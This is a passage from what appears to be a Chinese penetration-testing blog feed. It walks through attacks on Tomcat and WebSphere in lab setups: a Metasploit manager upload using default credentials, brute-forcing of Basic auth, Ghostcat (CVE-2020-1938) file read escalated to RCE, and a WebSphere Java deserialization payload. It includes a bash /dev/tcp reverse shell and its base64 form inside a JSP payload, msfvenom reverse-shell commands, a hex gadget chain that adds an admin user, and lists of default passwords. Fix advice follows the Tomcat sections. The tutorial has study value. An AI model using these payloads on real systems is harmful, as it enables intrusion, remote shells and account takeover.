pan></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="MSF攻击"><a href="#MSF攻击" class="headerlink" title="MSF攻击"></a>MSF攻击</h4><pre class="line-numbers language-none"><code class="language-none">use exploit/multi/http/tomcat_mgr_upload set HttpUsername tomcatset HttpPassword tomcatset rhosts 192.168.175.191set rport 8080exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里就直接略过了 自己去操作一下 </p><p>这就成功进来了</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062034.png" alt="1619340998143"></p><h4 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h4><pre class="line-numbers language-none"><code class="language-none">1、在系统上以低权限运行 Tomcat应用程序。创建一个专门的 Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）2、增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置）。在CATALINA_HOME/conf/web.xml文件设置锁定机制和时间超时限制3、以及针对manager-gui/manager-status/manager-script等目录页面设置最小权限访问限制<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Tomcat-manager-App暴力破解"><a href="#Tomcat-manager-App暴力破解" class="headerlink" title="Tomcat manager App暴力破解"></a>Tomcat manager App暴力破解</h3><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>我们先抓后台的包</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062035.png" alt="1619341538485"></p><p>然后放包  进行登录  </p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062036.png" alt="1619341565301"></p><p>这里注意这段回显</p><pre class="line-numbers language-none"><code class="language-none">Authorization: Basic dG9tY2F0OnRvbWNhdA==<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062037.png" alt="1619341609504"></p><p>发现Tomcat的后台登录账号和密码</p><p>是以base64加密的 账号:密码</p><p>然后我们重新去抓后台的包 进行爆破</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062038.png" alt="1619341768817"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062039.png" alt="1619341811564"></p><p>添加密码本 和base64 的编码规则 </p><p>把这个自带的编码 对勾去掉</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062040.png" alt="1619342044653"></p><p>开始攻击 拿到账号和密码</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062041.png" alt="1619342139990"></p><p>这里讲第二种方式</p><p>自定义迭代器</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062042.png" alt="1619342352290"></p><p>分位置 进行不同的载入</p><p>比如这里 就应该是3个位置</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062043.png" alt="1619342430579"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062044.png" alt="1619342458443"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062045.png" alt="1619342481874"></p><p>下面和之前的设置 一样 </p><p>base64编码 和去掉对勾 默认的Url编码</p><h4 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h4><pre class="line-numbers language-none"><code class="language-none">1.取消 manager/html功能2.manager页面应只允许本地IP访问<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Tomcat-AJP文件包含漏洞分析-CVE-2020-1938"><a href="#Tomcat-AJP文件包含漏洞分析-CVE-2020-1938" class="headerlink" title="Tomcat AJP文件包含漏洞分析(CVE-2020-1938)"></a>Tomcat AJP文件包含漏洞分析(CVE-2020-1938)</h3><h4 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>由于 Tomcat在处理<code>AJP</code>请求时，未对请求做任何验证</p><p>通过设置AJP连接器封装的 request对象的属性，导致产生任意文件读取漏洞和代码执行漏洞！<br>CVE-2020-1938又名 GhostCat，由长亭科技安全研究员发现的存在于 Tomcat中的安全漏洞，由于 Tomcat AJP协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector可以读取或包含 Tomcat上所有 webapp目录下的任意文件，例如可以读取 webapp配置文件或源码。</p><p>此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。</p><h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><p>漏洞成因是两个配置文件导致</p><p>Tomat在部罢时有两个重要的配置文件<code>conf/server.xml、conf/web.xml</code></p><p>前者定义了 Tomcat启动时涉及的组件属性，其中包含两个connector(用于处理请求的组件)</p><p>如果开启状态下，tomcat启动后会监听8080、8009端口，它们分别负责接受http、ajp协议的数据</p><p>后者则和普通的javaWeb应用一样，用来定义servlet</p><pre class="line-numbers language-none"><code class="language-none">Apache Tomcat 9.x &lt; 9.0.31Apache Tomcat 8.x&lt;8.5.51Apache Tomcat 7.x&lt;7.0.100Apache tomcat 6.x<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://xz.aliyun.com/t/7325">https://xz.aliyun.com/t/7325</a></p><p><a href="https://yinwc.github.io/2020/03/01/CVE-2020-1938/">https://yinwc.github.io/2020/03/01/CVE-2020-1938/</a></p><h4 id="运行过程"><a href="#运行过程" class="headerlink" title="运行过程"></a>运行过程</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062046.png" alt="image-20210718060241151"></p><p>从图中可以看出，Tomcat最顶层的容器是 Server，其中包含至少一个或者多个 Service，一个 Service有多个 Connector和一个 Container组成。</p><p>这两个组件的作用为:</p><pre class="line-numbers language-none"><code class="language-none">1、Connector用于处理连接相关的事情，并提供Socket与Request和Response相关的转化；2、Container用于封装和管理 Servlet，以及具体处理 Request请求<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>Tomcat默认的<code>conf/server.xml</code>中配置了2个Connector，</p><p>一个为8080端口  HTTP协议(1.1版本)端口，默认监听地址：<code>0.0.0.0:8080</code></p><p>另外一个就是默认的8009 AJP协议(1.3版本)，默认监听地址为：<code>0.0.0.0:8009</code>，两个端口默认均监听在外网。此次漏洞产生的位置便是8009 AJP协议，此处使用公开的利用脚本进行测试，可以看到能读取<code>web.xml</code>文件</p><h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>利用vulhub</p><pre class="line-numbers language-none"><code class="language-none">cd tomcat/CVE-2020-1938sudo docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062047.png" alt="1619348867355"></p><p>Poc地址：<a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a> </p><p>脚本是基于Python2的</p><p>它可以看webapps目录下的所有东西</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062048.png" alt="1619349787403"></p><p>可以看到它的语法要求</p><pre class="line-numbers language-none"><code class="language-none">python2 文件读取.py 192.168.175.191 -p 8009 -f webapps目录下的待读取的文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">python2 文件读取.py 192.168.175.191 -p 8009 -f /WEB-INF/web.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062049.png" alt="1619349894166"></p><p>文件包含RCE </p><p>在线bash payload生成： <a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a> </p><pre class="line-numbers language-none"><code class="language-none">bash -i &gt;&amp; /dev/tcp/192.168.175.191/8888 0&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062050.png" alt="1619350245468"></p><pre class="line-numbers language-none"><code class="language-none">bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NS4xOTEvODg4OCAwPiYx}|{base64,-d}|{bash,-i}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最终的txt的payload</p><pre class="line-numbers language-none"><code class="language-none">&lt;%    java.io.InputStream in = Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NS4xOTEvODg4OCAwPiYx}|{base64,-d}|{bash,-i}").getInputStream();    int a = -1;    byte[] b = new byte[2048];    out.print("&lt;pre&gt;");    while((a=in.read(b))!=-1){        out.println(new String(b));    }    out.print("&lt;/pre&gt;");%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这边要手动上传上去 </p><p>查看</p><pre class="line-numbers language-none"><code class="language-none">sudo docker ps<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062051.png" alt="1619350478774"></p><p>然后开始上传</p><pre class="line-numbers language-none"><code class="language-none">sudo docker cp /home/dayu/Desktop/1.txt 6c80deb9d194:/usr/local/tomcat/webapps/ROOT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以去docker 底层看看</p><pre class="line-numbers language-none"><code class="language-none">sudo docker exec -ti 6c bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062052.png"></p><p>成功传上去了</p><p>开启nc监听 </p><p>具体可以看这里：<a href="https://blog.csdn.net/qq_30653631/article/details/93749505?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_v2~rank_aggregation-1-93749505.pc_agg_rank_aggregation&amp;utm_term=Ubuntu%E5%AE%89%E8%A3%85nc&amp;spm=1000.2123.3001.4430">https://blog.csdn.net/qq_30653631/article/details/93749505?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_v2~rank_aggregation-1-93749505.pc_agg_rank_aggregation&amp;utm_term=Ubuntu%E5%AE%89%E8%A3%85nc&amp;spm=1000.2123.3001.4430</a></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062053.png" alt="1619351018857"></p><pre class="line-numbers language-none"><code class="language-none">python2 文件包含.py 192.168.175.191 -p 8009 -f 1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062054.png" alt="1619351185840"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062055.png" alt="1619351175429"></p><p>可以看到成功上线了</p><p><strong>可以和War联动是吧 可以和PUT联动</strong></p><h4 id="把shell弹到MSF上"><a href="#把shell弹到MSF上" class="headerlink" title="把shell弹到MSF上"></a>把shell弹到MSF上</h4><p>MSF生成木马</p><p>我这边还是上kali吧  Ubuntu不是很顺手</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.175.167 LPORT=4444 R &gt; shell.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062056.png" alt="1619351850151"></p><pre class="line-numbers language-none"><code class="language-none">sudo docker cp /home/dayu/Desktop/shell.txt 6c80deb9d194:/usr/local/tomcat/webapps/ROOT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>去docker底层看看</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062057.png" alt="1619351998810"></p><p>上MSF 开启监听</p><pre class="line-numbers language-none"><code class="language-none">msf6 &gt; use exploit/multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) &gt; set payload java/jsp_shell_reverse_tcppayload =&gt; java/jsp_shell_reverse_tcpmsf6 exploit(multi/handler) &gt; set lhost 192.168.175.167lhost =&gt; 192.168.175.167msf6 exploit(multi/handler) &gt; set lport 4444lport =&gt; 4444msf6 exploit(multi/handler) &gt; exploit -j<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行文件包含RCE</p><pre class="line-numbers language-none"><code class="language-none">python2 文件包含.py 192.168.175.191 -p 8009 -f shell.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062058.png" alt="1619352574611"></p><p>可以看到已经拿到shell了</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062059.png" alt="1619352504843"></p><p>按shell就可以进来了</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062100.png" alt="1619352730021"></p><h4 id="修复建议-3"><a href="#修复建议-3" class="headerlink" title="修复建议"></a>修复建议</h4><p>1、将 Tomcat立即升级到9.0.31、8.5.51或7.0.100版本进行修复<br>2、禁用AJP协议<br>具体方法：</p><p>编辑<code>/conf/server.xml</code>，找到如下行：</p><pre class="line-numbers language-none"><code class="language-none">&lt;Connector port="8009"protocol="AJP/1.3" redirectPort="8443" /&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注释或删除</p><p>3、配置 secret来设置AJP协议的认证凭证。</p>]]></content>
      
      
      <categories>
          
          <category> 服务攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tomcat小结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebSphere小结</title>
      <link href="/2021/10/28/websphere/"/>
      <url>/2021/10/28/websphere/</url>
      
        <content type="html"><![CDATA[<h1 id="WebSphere"><a href="#WebSphere" class="headerlink" title="WebSphere"></a>WebSphere</h1><h2 id="Windows安装WebSphere8-5-5"><a href="#Windows安装WebSphere8-5-5" class="headerlink" title="Windows安装WebSphere8.5.5"></a>Windows安装WebSphere8.5.5</h2><p>官网： <a href="http://www-01.ibm.com/support/docview.wss?uid=swg27004980">http://www-01.ibm.com/support/docview.wss?uid=swg27004980</a></p><p>进行下载：<a href="https://www-01.ibm.com/support/docview.wss?uid=swg27025142#ibm-content">https://www-01.ibm.com/support/docview.wss?uid=swg27025142#ibm-content</a></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109944.png" alt="image-20210510133954087"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109946.png" alt="image-20210510134500768"></p><p>创建一个账号</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109947.png" alt="image-20210510134149597"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109948.png" alt="image-20210510134325376"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109949.png" alt="image-20210510134526576"></p><p>应用这个安装工具 进行下载 还需要科学上网才可以</p><p>下载完成后 进行安装 一路默认即可</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109950.png" alt="image-20210510140918427"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109951.png" alt="image-20210510141004103"></p><p>还要用WAS作为库 去支撑</p><p>官网： <a href="http://www.ibm.com/en-us/homepage-a.html">http://www.ibm.com/en-us/homepage-a.html</a> </p><p>搜索这个：</p><pre class="line-numbers language-none"><code class="language-none">Websphere Application Server for Developers<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109952.png" alt="image-20210510135836589"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109953.png" alt="image-20210510135920412"></p><p>下载完成后</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109954.png" alt="image-20210510140547275"></p><p>导入并全部解压</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109955.png" alt="image-20210510141248019"></p><p>然后添加引导</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109956.png" alt="image-20210510141033686"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109957.png" alt="image-20210510141343331"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109958.png" alt="image-20210510141437173"></p><p>然后进行安装</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109959.png" alt="image-20210510141607888"></p><p>一路默认下去 进行安装</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109960.png" alt="image-20210510141717023"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109961.png" alt="image-20210510141816900"></p><p>继续进行添加server</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109962.png" alt="image-20210510142029352"></p><p>然后启动概要管理 工具</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109963.png" alt="image-20210510142224175"></p><p>进行创建  这边我的选择是应用服务器</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109964.png" alt="image-20210510142330862"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109965.png" alt="image-20210510142347884"></p><p>一路默认过去</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109966.png" alt="image-20210510142511033"></p><p>这是一些默认的端口</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109967.png" alt="image-20210510142553568"></p><p>这里的对勾去掉</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109968.png" alt="image-20210510142634245"></p><p>一路默认 进行创建</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109969.png" alt="image-20210510142722999"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109970.png" alt="image-20210510143002591"></p><p>成功创建 概要文件配置完成</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109971.png" alt="image-20210510143018125"></p><p>概要文件的目录结构：</p><pre class="line-numbers language-none"><code class="language-none">C:\Program Files (x86)\IBM\WebSphere\AppServer<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109972.png" alt="image-20210510143040680"></p><p>管理员权限运行cmd </p><pre class="line-numbers language-none"><code class="language-none">cd C:\Program Files (x86)\IBM\WebSphere\AppServer\binstartServer -help<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109973.png" alt="image-20210510143233306"></p><p>启动WAS</p><pre class="line-numbers language-none"><code class="language-none">startServer server1 -profileName AppSrv01<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动成功</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109974.png" alt="image-20210510143423525"></p><p>停止</p><pre class="line-numbers language-none"><code class="language-none">stopServer 服务名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>本地进行访问</p><pre class="line-numbers language-none"><code class="language-none">http://localhost:9060/ibm/console<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109975.png" alt="image-20210510143601531"></p><p>尝试登录 登录成功</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109976.png" alt="image-20210510143648948"></p><p>远程访问也是可以的</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109977.png" alt="image-20210510145625498"></p><p>下载安装部署就完成了</p><h2 id="docker安装WebSphere7"><a href="#docker安装WebSphere7" class="headerlink" title="docker安装WebSphere7"></a>docker安装WebSphere7</h2><pre class="line-numbers language-none"><code class="language-none">docker search WebSphere7docker pull /websphere7docker run -d -p 9060:9060 -p 9043:9043 -p 8880:8880 -p 9080:9080 iscrosales/websphere7# 开启docker的websphere7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109978.png" alt="image-20210510145346525"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109979.png" alt="image-20210510145418044"></p><p>远程登录一下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109980.png" alt="image-20210510145725437"></p><p>成功部署完成</p><h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h3><p>访问</p><pre class="line-numbers language-none"><code class="language-none">8880端口<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109981.png" alt="image-20210510150415268"></p><p>进行抓包</p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; import base64&gt;&gt;&gt; from binascii import unhexlify&gt;&gt;&gt; command = "net user test QWEasd123 /add"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">serObj = unhexlify("ACED00057372003273756E2E7265666C6563742E616E6E6F746174696F6E2E416E6E6F746174696F6E496E766F636174696F6E48616E646C657255CAF50F15CB7EA50200024C000C6D656D62657256616C75657374000F4C6A6176612F7574696C2F4D61703B4C0004747970657400114C6A6176612F6C616E672F436C6173733B7870737D00000001000D6A6176612E7574696C2E4D6170787200176A6176612E6C616E672E7265666C6563742E50726F7879E127DA20CC1043CB0200014C0001687400254C6A6176612F6C616E672F7265666C6563742F496E766F636174696F6E48616E646C65723B78707371007E00007372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E747400124C6A6176612F6C616E672F4F626A6563743B7870767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F647571007E001E00000002767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707671007E001E7371007E00167571007E001B00000002707571007E001B00000000740006696E766F6B657571007E001E00000002767200106A6176612E6C616E672E4F626A656374000000000000000000000078707671007E001B7371007E0016757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000017400")serObj += (chr(len(command)) + command).encode('ascii')serObj += unhexlify("740004657865637571007E001E0000000171007E00237371007E0011737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F40000000000010770800000010000000007878767200126A6176612E6C6serObjB64 = base64.b64encode(serObj).decode()print(serObjB64)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个码就是要回传到服务器上的码</p><pre class="line-numbers language-none"><code class="language-none">rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAVzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AHgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+AB5zcQB+ABZ1cQB+ABsAAAACcHVxAH4AGwAAAAB0AAZpbnZva2V1cQB+AB4AAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAbc3EAfgAWdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAHG5ldCB1c2VyIHRlc3QgUVdFYXNkMTIzIC9hZGQ=<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109982.png" alt="image-20210510152013110"></p><p>脚本执行</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282109983.png" alt="image-20210510195132106"></p><pre class="line-numbers language-none"><code class="language-none">python websphere_rce.py 192.168.175.212:8880 'net user test QWEasd123 /add' --proto https<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h3><pre class="line-numbers language-none"><code class="language-none">websphere/ webspheresystem/ manager<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">:9060/ibm/console/logon.jsp:9043/ibm/console/logon.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>甚至在6.x 至7.x的版本中 后台登录只需要输入admin作为标识符，无需密码 即可登录后台</p>]]></content>
      
      
      <categories>
          
          <category> 服务攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WebSphere小结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows API学习</title>
      <link href="/2021/10/28/windows-api-xue-xi/"/>
      <url>/2021/10/28/windows-api-xue-xi/</url>
      
